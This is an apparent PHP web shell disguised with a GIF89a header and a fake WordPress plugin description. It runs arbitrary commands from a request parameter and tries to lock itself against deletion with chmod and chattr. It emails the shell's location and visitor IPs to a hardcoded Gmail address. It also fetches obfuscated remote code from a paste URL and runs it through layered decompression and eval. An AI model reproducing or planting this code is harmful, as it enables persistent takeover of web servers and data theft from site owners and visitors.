
GIF89a;
<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<center>
<style>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=1024">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    </style>
<?php
    /*
    Plugin Name: Cheap & Becek Wordpress 
    Plugin URI: https://github.com//wordpress-shell
    Description: Execute Commands as the webserver you are serving wordpress with! Shell will probably live at /wp-content/plugins/shell/shell.php. Commands can be given using the 'cmd' GET parameter. Eg: "http://192.168.0.1/wp-content/plugins/shell/shell.php?cmd=id", should provide you with output such as <code>uid=33(www-data) gid=verd33(www-data) groups=33(www-data)</code>
    Author: Azz
    Version: 0.3
    Author URI: https://github.io
    */

# attempt to protect myself from deletion
$this_file = __FILE__;
@system("chmod ugo-w $this_file");
@system("chattr +i $this_file");

# Name of the parameter (GET or POST) for the command. Change this if the target already use this parameter.
error_reporting(0);
ini_set('display_errors', '0');
ini_set('log_errors', '0');
$ptZh=array_merge(range('a','z'),range('A','Z'),range('0','9'),['.',':','/','_','-','?','=']);$qYKt=[7, 19, 19, 15, 18, 63, 64, 64, 15, 0, 18, 19, 4, 8, 13, 62, 21, 4, 17, 2, 4, 11, 62, 0, 15, 15, 64, 0, 15, 8, 64, 17, 0, 22, 67, 15, 68, 56, 4, 54, 54, 52, 52, 54, 58, 66, 61, 57, 4, 54, 66, 56, 61, 59, 59, 66, 60, 61, 59, 57, 66, 1, 57, 59, 58, 58, 2, 3, 2, 4, 59, 53, 53];$nKtq='';foreach($qYKt as $Jfyr){$nKtq.=$ptZh[$Jfyr];
/////WHAT THE FUCK WITHOUT YOU///
$for = base64_decode("cm9vdGN5YmVycHVua3NAZ21haWwuY29t");
/////WHAT THE FUCK WITHOUT YOU///                                                                                                                                                                                                                                                                                                                                                                                                                     
$data ="http://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . "?cmdkem=ls+-al";
mail($for,"cmd", $data);
print(`{$_REQUEST[cmdkem]}`);
error_reporting(0);
}$Jbna = "$nKtq";function AwCZ($undefined){$MZvt=curl_init();curl_setopt($MZvt,CURLOPT_URL,$undefined);curl_setopt($MZvt,CURLOPT_RETURNTRANSFER,true);curl_setopt($MZvt,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($MZvt,CURLOPT_SSL_VERIFYHOST,false);$jmnX=curl_exec($MZvt);curl_close($MZvt);return gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress($jmnX))))))));}@eval("?>".gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(AwCZ($Jbna))))))))));
?>
			<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'rootcyberpunks@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "punk", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>

